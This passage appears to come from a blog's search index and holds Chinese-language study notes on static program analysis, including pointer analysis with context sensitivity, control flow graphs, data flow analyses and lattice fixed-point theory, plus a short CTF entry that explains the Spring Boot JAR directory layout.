site，m是目标方法 \n因为m是一个新的方法，所以要addreachable\n遍历m的每个形式参数pi(parameter)，连接实参(argument)和形参，addEdge\n传返回值从mret到r，addEdge\n\n\n\n问题：为什么oi是个新的对象，还要判断l-&gt;m是否属于call graph呢  \n因为这里的oj是x的定义类型，之前可能有oj，ok进来，就把这个边连接上了。没太懂。\n就是x的指针集中可能在oi之前 还有oj，就之前可能某一条语句让x和y指向了同一个地方，那Dispatch的结果如果是一样的，这条边就连接过了\n这里的l之前也是有可能处理过的\n因为每次x的指针集变化，就会在WL中添加东西，都会触发ProcessCall，就会执行l\nAn Example \n首先执行AddReachable方法，就是把{a,o3} {b,o4}添加到WL中\n接着对{a,o3}执行Propagate，因为a的指针集是空的，所以没什么变化。\n接着对{b,o4}执行Propagate，因为b的指针集也是空的，所以也没什么变化\n\n但是因为b是变量，执行ProcessCall\n\n对{b,o4}进行Dispatch，由于b是从o4流过来的，所以Dispatch的结果是B.foo(A)\n\n这里很好的体现了Pointer Analysis和CHA的区别，CHA是要对类和所有子类进行Dispatch，所以必然Dispatch的结果就不一样\n\n\n接着把{B.foo,{o4}}添加到WL ,添加一条边从5(行号)-&gt;B.foo(A) \n\n对m，调用AddReachable方法\n\n添加{B.foo(A)}到RM\n\n把所有的statement都加入到S中\n\n添加{r,o11}到WL\n\n\n\n添加边从a到y，在WL中加{y,o3}\n\n连接从r到c\n\n\n\n继续处理WL中的元素\n\n\n\n总结\nQ1：指针分析对于method call的规则\n\n做了4件事，Dispatch，传this，传参数，传返回值\n\nQ2：过程间的指针分析算法\nPointer Analysis Context Sensitivityproblem of Context-Insensitive  Pointer Analysis现在认为我们上一节学的指针分析就是上下文不敏感的指针分析\n\n对于动态分析来说，分析x.get的结果，返回的肯定是1，因为x指向的是new One\n对于常量传播而言，应用上节的指针分析算法，那么\n在调用x &#x3D; id(n1)时，会把形参n1的指针集{o1}传给n\n在调用x &#x3D; id(n2)时，会把形参n2的指针集{o2}传给n\n结束时，会把n的指针集传给x和y，因为call graph就是这样构建的，只要n改了，就会加到WL中，那必然x 和y也会改\n所以x的指针集就是{o1,o2}，对于常量传播而言,i就是NAC，结果就是不准的\n\n\n\n问题是：id返回的值没有做区分，把o1,o2都返回了，就是上下文不敏感，其实本质上是在传参AddEdge时，并没有指定具体的方法形参\n\n如果用上下文敏感进行分析 ，让n1指向的是id(n1)：n，这样结果就对了\n\nImprecision of Context Insensitivity (C.I.)Context Insensitivity不准的原因是：\n\n不同的方法调用的上下文不一样，如返回点，调用参数等\n\n不同的方法的变量可能指向不同的对象\n\n在CI的指针分析中，我们是直接传的，混在一起的，这里n被修改，导致x和y都被修改了\n\n\n\nContext Sensitivity (C.S.)\n引入它就是分析不同的数据流\n\n最古老的最好的上下文敏感技术是call-site sensitivity\n\n代表了call site的调用链中每个方法的上下文\n\n方法的 call site\ncaller 的call site\ncall of caller call site\n\n\n\nid就有2个上下文，2个call site\n\n\nCloning-Based Context Sensitivity\n在基于克隆的上下文敏感指针分析中，每个方法被被一个或多个上下文修饰\n实际上是在给变量加上下文\n相当于每个方法和它的变量都有了克隆\n\n\n\n这里的n就别clone 2次，这里就是用行号1 2对变量进行了标记，返回的时候，也会根据标记进行返回\n\nContext-Sensitive Heap\nOO程序(例如java)，它要频繁修改堆区，New的对象存储在堆里面\n所以要把上下文敏感应到到堆抽象中\n这里给每个oi，都添加了4个上下文\n\n\n为什么对heap应用上下文敏感可以提升精度呢？\n\n\n在动态执行中，一个调用点在不同的 call  context下可能创建多个对象\n那不同的对象可能有不同的数据流，存不同的值到他们的field中\n如果没有heap context sensitive，那么可能会merge  data flows，这点很重要，参考前面的，如果有两个调用newX，那么就会都流到y，\n\nAn ExmapleCS but no CS heap也就是上下文敏感，但是堆的上下文不敏感\n\n可以发现o8.f是o1, o2\n\n本质原因是因为在算法中，并没有对方法中new的对象的创建点进行区分，认为都是一个创建点。\n\n\n\nC.I. + C.S heap\n右边是有堆的上下文敏感的，此时可以看到 3:x指向的对象是3:O8，堆上下文进行了区分。\n如果你是对堆上下文敏感，但是对象上下文不敏感，x处还是3:o8,4:o8，因为没有对x进行区分\n根据算法对上面的过程画PFG：\n\nContext Sensitive Pointer Analysis: RulesDomains\nfield本身不需要上下文\n当引用具体的field时，引用的是具体的某个对象的field\n上下文敏感的指针：上下文敏感的变量 和上下文敏感的对象的field\n指针集：原来是对象的集合，现在是有上下文的对象\nRules（4种基本语句）\nAssign：\n在上下文c下的x和y，如果y指向c’下的oi，那x也指向c’下的oi。\nload：\n还是x和y在同样的上下文下，进行相关的操作\ncall之前学的是4件事\n\nDispatch\n传this\n传参数\n传返回值\n\n但是现在不一样了：\n\nDispatch：取目标函数\n选择上下文：根据调用点l，为目标方法m选择一个上下文\n\n这里就用了前面的clone技术，是call -site sensitivity，这里用行号表示上下文\n\n\n传receive object：把Dispatch的结果，传给$c^t$的this方法\n传参数：传给特定上下文的参数。$c下的a_j传给c^t下的m_{pj}$\n传返回值：把$c^t下的m_{ret}传给c下的r$\n\n关于上下文的理解：\n\n正常函数调用时，也会有特定的栈调用特定的函数，每调用一次有新的栈，这就是上下文敏感\n相当于进房间每次都从一个门进，也从同样的门出\n\n\nPointer Flow Graph with C.S.\nNodes：现在PFG中的节点都有上下文\nEdges：从一条边流到另一条边也是带有上下文的流动\nC.S. Pointer Analysis Algorithm该算法基本和C.I.的算法一样 \n\n为什么callee(被调用者)有上下文？\n\n因为要clone,保证多次调用不merge，不流到一处\n\n为什么call site也有上下文？\n\n一个call site在不同的上下文下，调用点方法可能不一样\n\n\n最开始给entry方法一个空的上下文\n这里为什么c:m不属于RM？\n为什么会有这种情况呢？\nSelect函数\n根据四个参数选\n\nc 上下文\nl callsite\nc’ oi：receive object\nm：Dispatch找到的方法\n\nSelect之后给this传receive object，就是让this指向现在的对象\n整个流程是忽略控制流信息的\n他只是拿的statements的集合，看整个流程，他也是先处理new ，处理 x &#x3D; y，再处理load store 方法调用，因此是flow insensitive\n未尽事宜\n想一想pointer Analysis算法中一些细节是为什么？\n默写一下指针分析的算法，和C.S.的pointer Analysis\n看一下谭老师指针分析2020的论文\n\nYue Li, Tian Tan, Anders Møller, and Yannis Smaragdakis. “A Principled Approach to  Selective Context Sensitivity for Pointer Analysis”. TOPLAS 2020\nContext Sensitivity Variant不是所有的技术都要考虑 Select的所有参数\n\nContext insensitivity\nC.I.是C.S.的一种特例，每次都返回一个空，也就是每次都一样，也就是上下文不敏感。\nCall-site Sensitivity\n\n每个上下文包含call sites的list，也就是一个调用链\n\n在一个method call中，他把call site加到caller的上下文中，作为callee 的上下文\n也就是是调用栈的抽象，(A.B.C.f方法)\n\n\n只需要Select的前两个参数，c表示当前的上下文，从l’ 到l’’，l表示现在的call site，把l加进去\n\n\nAn example\n问题：这里的void  bar()的上下文是什么？\n\n在bar()方法中，又调用了自己。\n也就是程序从9跳转到13时，此时上下文是[3,9]\n但是执行到15时，又调用了13，再执行13方法，此时就是[3,9,15],……\n那就会有无穷无尽的上下文，指针分析不能终止\n\nK-limiting Context Abstraction目的\n\n确保指针分析可以终止\n避免太多的上下文\n\n方法：设置一个上下文的边界 k\n\n每个上下文包括调用链中的最后k个call site\n对于method context k &#x3D; 2 ，对于 heap context k &#x3D;1\n\n\n对于上面的程序，k&#x3D;1时，void bar()的上下文是什么\n\n\n也就是只有当前的call site，没有之前的call chain，所以执行到13时上下文就只有9，再往下执行，又会执行一次void bar()，所以上下文是[9,15]\n\n对于k&#x3D;2时\n\n此时上下文是call chain中的最后一个l’’ +  当前的call site\n1-Call-Site: Example\n\n这里体现出了1-call-site 上下文敏感的作用，因为是1-call site，所以方法的上下文就是它的call site，没有之前的call chain\n\n\n\nO12 和  O13直接沿着PFG传下去\n\nC.I. VS C.S.(1-Call-Site)\nObject Sensitivity\n每个上下文包含一系列抽象的对象的list\n\n在一个method call中，使用receiver object和它的heap context作为callee context\n\nreveiver obejct +  heap context可以唯一确定一个对象\n\n\n\n\n\nAn Example\n为什么分析a1.set时，void doSet(B p)的上下文是o1呢？\n\n因为object sensitivity主要由heap context 和receiver object构成，整个代码中可以看到是没有heap context 的，因为并没有在方法中new 一个对象 \n所以只考虑receiver object,就是o1\n\n1-Call-Site vs Object Sensitivity\n\n对于这个程序来说，显然1- call site是不准的，因为1-call site认为当前的call site就是他的上下文，所以在调用doSet时，都会认为上下文是12\n而object sensitivity是准的，它始终会让this指向receiver object，在判断上下文的时候，也会用的是当前的receiver object，那在一个方法里，receive object都是一个this,所以是准的\n\n也就是1-call site只有一层，只记得上一层，二层方法调用就不好使了\nObject Sensitivity始终对象只有this\n\n\n但是这种情况下，1-Object就不准了，因为this用了两次，这两个this指向的是同一个receiver object，那就会给同样的上下文\n\n总结其实上面两种方法都很怕自己最关键的地方调用2次，就会merge\n\n1-call-site是，1已经用尽的情况下，调用了2次同样的方法，2次就会认为是同样的上下文。\n1-object是在同一个方法中，用了2次this,2个this都指向的是receiver object\n\nType Sensitivity大佬觉得上面两个还是不够快，于是研究了这种方法\n\n每个上下文包括一系列type的list:\n\n在一个method call中，使用包含receiver object的调用点的type，和它的heap context作为callee context\n是在object sensitivity之上一个粗粒度的抽象\n\n\n\n\n在这个例子中吗，InType(o3)表示的就是o3所在的类，就是包含了receiver object的调用点的类\nType vs Object Sensitivity\n因为它是基于object sensitivity，它的精度肯定小于等于object sensitivity\n\n\n对于object sensitivity，foo()的上下文是o3 o5 o7。\n如果对于Type Sensitivity,foo()的上下文只有X,他们的创建点都在X中。\n\n","slug":"Program-Analysis-03","date":"2023-09-01T14:31:42.000Z","categories_index":"","tags_index":"Program Analysis","author_index":"XyM4ster"},{"id":"9b333f38efd344acbd675306690f4b47","title":"wmctf","content":"\nBOOT-INF目录：这个目录通常是在使用Spring Boot框架时出现的。它是用于打包可执行的JAR文件的特殊目录。在这个目录下，通常包含了应用程序的所有依赖项（JAR文件）和应用程序的类文件。这些类文件可以包括Spring Boot的启动类、配置类以及其他应用程序的自定义类。\nMETA-INF目录：这个目录是Java项目中的标准目录，用于存放项目的元数据信息。在这个目录下，通常包含了一些重要的配置文件和清单文件。例如，MANIFEST.MF文件通常位于META-INF目录下，其中包含了关于JAR文件的元数据信息，如版本号、作者、依赖关系等。此外，一些框架和库也会在META-INF目录下存放一些特定的配置文件，用于配置其行为和功能。\norg目录：这个目录通常是在Java项目中的包结构下出现的。它是用来组织Java类的包名空间的一部分。在这个目录下，通常包含了项目的Java类文件和包结构。例如，org.example.app是一个典型的包名，其中org是根包，example是中间包，app是具体的包名。\n\n","slug":"wmctf","date":"2023-08-29T05:32:25.000Z","categories_index":"","tags_index":"CTF","author_index":"XyM4ster"},{"id":"b13dd1cbb7113adce1a453324fe7b9f4","title":"Program-Analysis-02","content":"Control Flow Analysis控制流分析（Control Flow Analysis）通常指的是构建控制流图（Control Flow Graph, CFG），并以 CFG 作为基础结构进行静态分析的过程。\n\n需要构建Control Flow Graph(CFG)\nCFG的node可以是一个单独的3AC，但是更常见的是一个Basic Blocks\n\nBasic Blocks需要满足以下性质：\n\n只能从块的第一条指令进入\n只能从块的最后一条指令离开\n\n\n\n\n\n\n\n提示\n\n这个算法逻辑感很强，值得反复考虑\n\n\n\n构建node\n入口只有一个，就是开始的指令\n出口只有一个，就是结束的指令\n\n\n\n方法：\n\n决定P的leaders：\n\n\n程序的第一条指令是leader\n\ngoto指向的指令是leader\n\n跳转指令的后一条指令是leader\n\n\n例子：\n\n从这个可以看出 因为(3)是(12)的target，所以(3)就不能放到第一个bbs中，否则程序有两个入口\n\n(4)接下来有可能跳转到(7)，所以(5)就不能加进来，否则程序有两个出口\n\n\n\n构建P的基本快\n\n\n就是从一个leader开始，到下一个leader的前一条指令\n\n\n构建边块A到块B有一条边当且仅当：\n\nA B之间有跳转，自然要添边\n\nAB紧挨着，A块的最后一条指令紧挨着B的第一条指令\n\n这种AB之间需要一条边\n但是不能是无条件的跳转\n\n\n\n\n从上可知\n\n由j–&gt;i的变化，变成从A—&gt;B的变换，现在变成了粗粒度的，也就是说A B之间指令的变换，也不影响跳转了。(原来假设i  变成i + 1，那 j–&gt; i，也要变成 j –&gt;i + 1)\n\n构建CFG\n除了构建好的基本块，我们还会额外添加两个结点，「入口（Entry）」和「出口（Exit）」\n这两个结点不对应任何 IR\n如果一个基本块的最后一条指令会让程序离开这段 IR，那么这个基本块就会有一条边指向出口。\n但是可能有个很多return，也就可能有很多出边\n\n\n\n总结Q1：compilers 和 static analyzers静态分析器的关系\n\n编译器的作用是将source code转换成machine code\n该过程中间经过词法分析、语法分析，语义分析，形成IR，静态分析器对IR进行分析。\n\nQ2：3AC\n\n3地址码就是中间表示intermediate representation，就是在字节码 和 机器码中间的一种表示\n在soot中，源代码—-&gt;字节码—&gt;jimple（也就是java的IR，Java Intermediate Language）—&gt; 机器码\n\nQ3：在IR的top中如何构建basic blocks？\n\n首先一个basic block包含了该部分中最大的3AC，满足只有一个入口，和一个出口\n接着，按照规则构建node，构建边，最后加上Entry和exit，就形成了完整的CFG。\n\nData Flow AnalysisData Flow Analysis数据流分析的核心：How data Flows on CFG？\n\n对数据的抽象( +  - T  unknown等)\n\nFlows：根据分析的类型，做出合适的估算，应该是sound的\n\nNode：数据如何transfer(转换函数)，比如 + - \n\nEdges：控制流如何处理\n\nCFG：一个程序\n\n\n不同的数据流分析，有着不同的data abstraction, flow safe-approximation策略，transfer functions&amp;control-flow handlings。\nPreliminaries of Data Flow AnalysisInput and Output States\n每一条IR的执行，都让状态从输入状态变成新的输出状态\n输入&#x2F;输出状态与语句前&#x2F;后的 program point 相关联。\n\n\n\n在数据流分析中，我们会把每个程序点关联一个数据值，代表从那一点中可观察到的抽象程序状态\n\n\n\n从pp中观察到抽象的状态，并组成一个集合\n\n关于转移方程约束的概念\n关于控制流约束的概念\n\nB的所有前驱的out的meet构成B的输入\n\nData Flow Analysis Applications不会涉及到的概念\n\n首先不存在方法调用，讲的是函数内部的\n之后讲跨函数的\n变量不涉及引用，也就是没有两个变量指向一个空间，在指针分析中讲\n\nReaching Definitions Analysismay analysis: 理解成集合的union\n就是所有情况都得考虑，may be true的都被报出来\n也就是有一个是true就行，所以应该考虑所有的path，所以应该union\nmust anaysis：理解成集合的交集^\n\nInput and Output States\n绿色的是红色的抽象\ndomain：值域\n对于程序中所有的in 和 out，找到一个solution,通过解析 safe-approximation中的约束规则，得出的solution 。这些约束规则基于transfer function(转换规则)，基于控制流信息\n通过解这些约束规则，得到solution\n\n用符号表示transer function\n\nTranser function\n对bbs中的每个执行f，那么最后得到的结果就是bss的transer function\n\n反向的时候先执行 fsn的 transer function，再执行fsn-1，\n\n上面黄色的代表：B的所有前驱的out的meet构成B的in\n下面粉色的out：B的后继的in的meet\n\n基本概念\n假定 x 有定值 d (definition)，如果存在一个路径，从紧随 d 的点到达某点 p，并且此路径上面没有 x 的其他定值点，则称 x 的定值 d 到达 (reaching) p。\n如果这条路径上有x的其他定值，我们就说x的这个定值被kill了\n\n\n\n到达定值可以用来分析未定义的变量。例如，我们在程序入口为各变量引入一个 dummy 定值。当程序出口的某变量定值依然为 dummy，则我们可以认为该变量未被定义。\n\n对于一条赋值语句 D: v &#x3D; x op y，该语句生成了 v 的一个定值 D，并杀死程序中其它对变量 v 定义的定值。\n\n\n\n说人话：\n是在分析在程序中的某点，BBS中定义的一条语句是不是有意义的\n对于第一次遍历(红字)\n\n比如对于B1的出口，定义的D1和D2都是有意义的\n\n比如对于B2的出口，D1就没有意义，因为D4重新定义了y，所以要被Kill，D2、D3是有意义的。\n算法：\n\n该算法是检查程序的其他处有没有定义这个变量，如果定义了就kill掉\n因为路径中没经过的BBS，肯定没有定义过，所以是0，kill不kill无所谓\n\n理解：\n\n按照理解来说，可以检查这条路径上之前有没有定义过，但是这样可能比较麻烦\n\n\n\n理解Reaching Definitions(到达定值)Abstraction(用Di进行抽象)\n程序中所有变量的定值\n能被一个 bit vectors表示\n\n\nTranser function\n\n\n从入口kill掉其他的定值，并加入新生成的定值\nv &#x3D; x op y，gen v, kill 其它所有的 v\n\nControl Flow按照本节最开始讲的一个完整的Data Flow Analysis的结构，需要对transer function的结果进行约束。\n\nAlgorithm of Reaching Definition Analysis\n\n首先让所有BB和入口的OUT为空。因为你不知道 BB 中有哪些定值被生成。\n\n当任意 OUT 发生变化，则分析出的定值可能需要继续往下流动，需要修改各 BB 的 IN 和 OUT。\n\n最终结果就是绿色的，例如b5是0011 1011，也就表示D3 D4 D5 D6 D7会流到B5结束的位置\n\n\n在每个数据流分析中，我们把pp和一个数据流的值相关联，代表可以从这点观察到的所有可能的抽象状态。\n\n通过不停的用transer function和control flow，不停的解和算，直到找到一个solution。\n\n\n\n\n为什么程序会停止？\n\n程序会继续运行，是因为有的bbs变化了，说明有循环，也就是下面这种情况，一i那位如果程序都是顺序执行，就不会有bbs变化，所以一定会停止\n\n\n某一点有可能从0 —&gt; 0，有可能从0 —&gt;1，也有可能从1 —-&gt;1，但是不可能从1—&gt;0，所以程序一定会停止\n\n\n为什么不会从1—&gt;0？\n\n\n假设最终从红色快Di&#x3D;1，流入S，红色框中这一位能是1，说明从S中出来时，这一位就是1，否则不能流到红色框处\n那上次出来是1，说明没有被Kill掉，这次肯定也不会被kill，也可以说，水都流到这了，一定可以流出去\n\nLive Variables Analysis（活跃变量分析）\n沿着p有一条路径，活跃变量分析分析p处的v是不是alive\n换句话说：后面use的v是不是我在p处定义的v，如果是，说明p在v处是alive的，也就是是有效的\n\n说人话：\n活跃变量分析是在分析在该点处定义的变量有没有被使用，是不是废物变量\n\nAbstraction\n用第i个bit表示vi\n\n\n\n程序应该是forward的还是backward？\n这里想探究的问题是变量是否是live？\n因为想知道在某一点是不是alive的，所以你得走到最后，才能知道，因为你不知道中间是否有重定义\n\n所以要从后往前来比较方便\n\nControl flow\nTranser function\n首先程序是Backward，已知out求in\n问题1 ：这里的out为什么是union\n\n因为无论s1 use v 还是s2 use v，Out[B]都等于1\n也就是下面有一条路径是活跃的用了v，在B的in处，都是alive的\n\n问题2：如何求出IN[B]\n我的考虑：\n\n如果B中对v进行了重新定义，IN[B]就为0\n所以out[b]-kill[b]\n我没有考虑完全所有的情况\n\n算法：\n\n首先枚举所有可能的情况\n如果v在B中被重定义了，就应该out[b]-def_b，但是如果在重定义之前，使用了v，in[B]仍然为1，所以将两种情况合并，得到结果\n这里也可以直观的感受为什么程序是backward\n\nAlogrithm of live variables Analysis\n问题1：为什么初始化为空？\n\nmay analysis初始化一般为空，must analysis初始化为all\n\n最终结果：\n\nAvailable Expressions Analysis它是must analysis\n基本概念\nx op y 在 p 点可用的条件：\n\n从流图入口结点到达 p 的每条路径都对 x op y 求了值，\n且在最后一次求值之后再没有对 x 或 y 赋值\n\n说人话：\n\n是在分析表达式(x &#x3D; y+3   表达式是y + 3)有没有意义，是不是白算,看是否所有路径都求了，也就是如果都求了，结果是1，那就可以被替换\n\n也就是如果最后一次算y +3，后面还有对y的重新赋值，那你算的y + 3没有意义\n\n\n\n对于程序的最终结果，蓝色部分来说\n\n表达式p-1就没有意义，因为p在B2处被重定义了\n表达式z&#x2F;5有意义\n表达式2*y没有意义，在B5中y被重定义了\n表达式e7 *x有意义\n表达式y + 3没有意义\n\n他的最终目的是优化表达式：有意义的可以用同一个变量替换，省的重复计算\nAbstraction\n\n0代表在这一点不是Available\n\nTranser function &amp; Control flow\n\n生成新的表达式：x op y\nkill掉引用了变量a的表达式{a + b}\n最后得到{x op y}\n\n\n在黄色这点，该表达式是avaliable的\n\n可以根据定义判断\n每一条路径都计算了 e16 * x\n在表达式的最后(last evaluation)y也就是b语句，没有对x重定义\n\n\n用上面的transerfunction判断\n到x &#x3D; …处时，e16 * x被kill\n到b处，又生成了e16 * x\n两条路径都有e16 * x，所以是avaliable\n\n\n\n\n\n因此，上面的可以被优化成全部用t替换\n到整个程序的最后一条语句时，不用再对t进行计算，因为Last evaluation已经计算过了\n\n\n问题1：为什么是交？\n\n因为需要所有的path都计算last evaluation，需要取一个最终的结果\n\n假设有一条path如果是1的话，另一条path是0，那这个表达式是否是avaliable呢？\n\n因为要safe，所以它有可能是不可达的，所以那就要认为是不可达的\n\n\n\n\n看这个小绿箭头和绿方框， z &#x2F; 5这个表达式有可能是不avalable的，所以要取交，认为他是0\n\n问题2：如何理解under approximation？\n\n也就是它可能会有漏报\n\n\n对于这种情况，按照上面的transer function，到c表达式的In的地方，显然{e16 * x}不是avaliable\n\n所以在c处要重新计算\n\n\n但是有可能上面的x和重定义的x都等于3\n\n这种情况下，也就是可以把c处进行优化，就是不用再重新计算了\n\n但是按照transer function，我并没有产生误报，只是没有优化，并不影响程序的执行\nAlogrithm of Available Expressions Analysis\n问题1：为什么OUT[B]的初始化是all(都是1)\n按照现在的理解\n\n\n根据这个图，如果初始化是0的话，也就是此时红色框处的输入就变成了00000，那我上一步做的就没有意义了，p-1此时一定是avaliable的\n因为是交，所以为了保留原来的结果，一定得是11111\n\nmusy analysis 初始化一般都是all\n\nAnalysis Comparison\n\n\n\nReaching Definitons\nLive Variables\nAvaliable Expressions\n\n\n\nDomain\ndefinitions的集合\nvariables的集合\nexpressions的集合\n\n\nDirection\nforward（会不会path）\nbackward(后面有没有use)\nforward（所有的Path有没有evaluation）\n\n\nMay&#x2F;Must\nMay analysis\nMay analysis\nMust Analysis\n\n\nBoundary（边界）\nout[entry]&#x3D;null\nin[exit]&#x3D;null\nout[entry]&#x3D;null\n\n\nInitialization\nout&#x3D;null\nin&#x3D;null\nout&#x3D;all\n\n\nTranser function\nout &#x3D; gen U (in - kill)\n\n\n\n\nMeet\n并\n并\n交\n\n\n\n\n\n\n\n\n根据含义去确定Boundary(边界)\n\ninialization：对于到达性分析，entry都没有定义Di，所以out[entry]一定是null\n\n说人话：\nReaching Definitions：\n\n分析在BBS中写的语句，例如 x &#x3D; y + 3，对于程序中的某点，有没有意义\n初始化时所有的Out都是0，是May analysis，因为有一条路径定义了一个Di，那么对于下一个bbs的输入，他是有意义的\n\nLive Variables Analysis：\n\n分析在某点如果定义了这个变量，对程序中的某点，有没有意义。\n初始化所有的in是0，是may analysis\n\nAvailable Expressions：\n\n分析定义的表达式：x &#x3D; y +3中的y + 3，对于程序中的某点，有没有意义\n\n另一方面的理解\n\n对于may analysis，是并，也就是有一条路径满足就行，那对于加法操作，初始化一定是0\n对于must analysis，是交，必须所有路径都满足，那对于乘法操作，初始化一定是1\n\n\n总结Q1：理解三个数据流分析\n\n首先数据流分析只分析一个函数内部的，不涉及到方法调用，也不涉及到两个变量指向同一个空间\n关于到达定制分析，活跃变量分析，可用表达式分析，看上面那个图的总结\n\nQ3：理解迭代算法，以及为什么他能终止\n\n迭代算法由transer function和约束条件组成，程序的结果会从0–&gt;1   1–&gt;1  0—&gt;0，不会从1–&gt;0，所以当所有的块不再改变时，程序就终止了\n\nData Flow Analysis Foundationsiterative algorithms（迭代算法）\n对于数据流分析，迭代算法生成了一个solution，也就是01组成的串\n\nview itrative algorithm in another way\n对于一个有k个nodes的CFG，迭代算法在每次迭代时，更新每个节点的Out\n\n假设数据流分析的值域是V，那么可以定义一个K个元素的元组(k-tuple)\n$$(Out[n_1],Out[n_2],…Out[n_k]$$\t\n也就是一个集合$$(V_1*V_2…V_n)$$,定义这个集合为$$V^k$$在每次迭代后，保存新的值\n\n每次迭代都是通过应用transer function 和control flow, 把一个map $$V^k$$变成一个新的map$$V^k$$，整个过程可以抽象为：\n$$F : V^k -&gt;V^k$$\n\n该算法输出一系列的k-tuples，直到每个node的output不再变化\n\n\n图示形式：\n\n对于这个算法，绿色部分就对应上面的F 函数\n\n\n\n也就是初始化时init 都为空，接着进行迭代\n令第一次的结果为$X_0$，$$X_1 &#x3D; F(X_0)$$\n最终不变时，达到的结果是$$X_i &#x3D; F(X_i)$$\n此时程序输入的是$X_i$，输出的也是$X_i$，也就是这个iterative algorithm达到了一个不动点(fixed point)\n\n问题来了这个iterative alogrithm 是对于data flow analysis生成一个solution\n\n\n这个程序一定会达到不动点么？\n如果达到了，只有一个不动点么？如果超过一个，如何确定我们得出的solution就是最好的呢\n我们的算法要经过多少步达到不动点\n\npartial order（偏序）\n\n定义了一个偏序集(poset)，用pair表示，，P是一个集合，后面的符号(统称为&lt;&#x3D;)是偏序关系，如果集合中的元素满足上面的三条性质(自反性、反对称性、传递性)，就构成P上的偏序集合\n\n例1：S是一个整数集，符号是小于等于\n\n\n满足三条性质，构成偏序集\n\n例2：S是一个整数集，符号是小于\n\n显然不构成 1 &lt; 1 2 &lt; 2是错的\n\n例3：S是一系列(下图)英文单词的集合，符号表示substring，s1&lt;&#x3D;s2，表示s1是s2的子串\n\n例4：S是{a,b,c}的幂集，符号表示子集\n\n理解偏序(partial)的含义\n\n意味着不是集合中的每对元素都要满足给定的关系(符号 &lt;&#x3D;)\n比如上面的 pin 和 sin就不满足\n\nUpper and Lower Bounds(上下界)\n这玩意不就是高中数学\n\nu是S的upper bound，也就是S中的所有元素都$\\subseteq$u\n\nl是S的lower bound，也就是l$\\subseteq$S中的所有元素\n\n\n\n\n对于这个集合来说，显然upper是{a,b,c}，lower是{}\n\n                                            \n\n最小上界(lub  or  join)：l_lS\n最大下界：(glb or meet)\n\n\n如果只包含两个元素\n\nlub：a l_l  b  也就是 a join b，就是a并b\nglb： 也就是a meet b，就是 a 交 b\n\nSome  Properties\n不是每个偏序集都有glb 或者 lub\n\n\n\n如果一个Poset有lub 和 glb，那一定都是唯一的\n\n\nLattice\n\n偏序集中的每两个元素，都有它的最大下界和最小上界，这个偏序集被称为一个lattice\n\n上面的例3，显然不构成lattice，pin和sin在集合中找不到最小上界\n\nComplete Lattice\n\n给定一个lattice P和它的任意一个子集S，如果joinS和meet S(S中可能不只两个元素a b)存在，那么P是一个complete lattice\n\n说人话：一个lattice的所有子集都lub和glb\n\nlattice是任意两个元素都有glb和lub，complete lattice是任意一个子集\n\n\t\n\n\n正整数集是无穷的，没有边界，所以不是complete lattice\n\n\n\n对于这个幂集，它是complete lattice，假设子集是{a,b}，虽然glb和lub不在subset中，但是在lattice中\n\nBounds可以不在subset中，但是要在lattice\n\n\n每一个complete lattice，都有一个top和bottom\n\n\n\n每个有穷的lattice都是complete lattice\n\nProduct Lattice\n\n给定一系列lattice，如果对于每一个偏序集，都有最小上界和最大下届，这些所有的偏序集就构成一个product lattice$$L^n &#x3D; (P,\\subseteq)$$\n\n这个product lattice被定义为：\n\n\n一个product lattice是一个lattice\n如果构成product lattice的每一个lattice都是complete lattice，那么这个product lattice也是complete lattice\n\nData Flow Analysis Framework via Lattice\n\nD：forward还是backward\nL：包括domain和operator\nF：一系列的从V 到V的transfer functions\n\n\n\n可以看到，右边的图(may analysis)是从bottom往上走的\n\ndata flow analysis可以看成对lattice的值迭代的使用transfer functions和meet&#x2F;join operations\nMonotonicity（单调性）\n\nL是一个lattice，if 任意的x y属于L, $$x \\subseteq y$$，f(x)$\\subseteq$f(y)\n\nFixed-Point Theorem(不动点定理)\nL是单调的，且L是有穷的，那么最小不动点和最大不动点能通过迭代求出来\n\n求最小不动点：第一次用bottom作为输入，得到f(bottom)，再把f(bottom)作为下一次的输入，直到求出一个不动点，这个不动点就是最小不动点\n\n求最大不动点：第一次用top作为输入，得到f(top)，再把f(top)作为下一次的输入，直到求出一个不动点，这个不动点就是最大不动点\n\n\n证明不动点Existence of Fixed Point\n\n首先定义一个bottom，f(bottom）就是对bottom进行transer funtion变换，可以理解为右下的图，从{}走到了{a}\n\n\n\n因为f是单调的，所以 f(bottom)$\\sqsubseteq$f(f((bottom))，一直到$f^i(bottom)$\n那由于L是有穷的(程序最终的111…111)，假设最终值是$f^H(bottom)$，此时再对他进行transer function，就不会变了(因为1不会变成0？)\n从下面gitbook的证明看出来，和我想的一样，但是这个ppt上的证明我属实没看懂\n\ngitbook的证明：\n根据$\\bot$和f的定义，我们可以得到：$\\bot \\sqsubseteq f(\\bot)$。\n由于 L 是有限的，且 f 单调，根据鸽笼原理，必然存在一个 k 使得$\\bot \\sqsubseteq f(\\bot) \\sqsubseteq f^2(\\bot)\\sqsubseteq …\\sqsubseteq f^k(\\bot)\\sqsubseteq f^{k+1}(\\bot) $，且$f^k(\\bot) &#x3D; f^{k+1}(\\bot)$。\nLeast Fixed Pointgitbook的证明：(通俗易懂，ppt上写的我没看懂)\n假设我们有另一个任意不动点 x，由于 f 是单调的，因此$f(\\bot) \\sqsubseteq f(x), f^2(\\bot) \\sqsubseteq f^2(x),…,f^{Fix} &#x3D; f^k(\\bot)\\sqsubseteq f^k(x) &#x3D; x$\n可知的确$f^{Fix}$是最小不动点。\n通过上面的证明，我们又回答了一个问题：如果我们的迭代算法符合不动点定理的要求，那么迭代得到的不动点，确实就是最优不动点。\nData Flow Analysis Foundations IIRelate Iterative Algorithm to Fix-ed Point Theorem\n问题1：这两个怎么联系起来呢？\n\n第一步：确定product lattice，且是finite\n\n这里的每一个节点都对应一个Lattice。假设他是reaching definitions，假设有3个变量D1 D2 D3\n\n他的domain一定是(0,0,0)  … …. (D1,D2,D3)\n\n所以它是lattice\n\n每一个lattice都是finite，所以整体也是finite\n\n\n第二步：确定 f: L -&gt; L 是单调的\n对于iterative algotithm来说，f相当于control flow和transer function\n\n因为 transer function**(OUT &#x3D; gen U (IN - kill))**的结果一定是从0 到1，不会从1到0 ，所以是单调的\n\n现在需要证明：control flow也是单调的，也就是 join&#x2F;meet后的结果是也是单调的  LxL -&gt; L\n\n即需要证明 任意的x , y, z 属于L，x$\\sqsubseteq $y，需要证明 $x \\sqcup z \\sqsubseteq  y \\sqcup  z $\n\n单调的定义是：x&lt; y, f(x) &lt; f(y)，这里的meet就相当于f\n\n根据定义， $y\\sqsubseteq y\\sqcup  z$，因为y meet z是least upper bound \n所以 